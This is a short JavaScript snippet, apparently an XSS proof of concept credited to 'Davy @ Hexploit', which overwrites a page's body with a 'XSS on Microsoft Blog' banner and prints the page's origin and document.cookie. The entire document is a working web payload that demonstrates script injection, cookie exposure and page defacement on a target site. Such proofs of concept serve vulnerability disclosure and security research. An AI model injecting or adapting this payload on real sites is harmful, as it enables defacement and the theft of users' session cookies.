document.body.innerHTML = `
  <div style="background:black;color:lime;font-size:32px;padding:50px;text-align:center;">
    <h1>💀 XSS on Microsoft Blog 💀</h1>
    <p>PoC by Davy @ Hexploit</p>
    <p>window.origin: ${window.origin}</p>
    <p>document.cookie: ${document.cookie}</p>
  </div>
`;
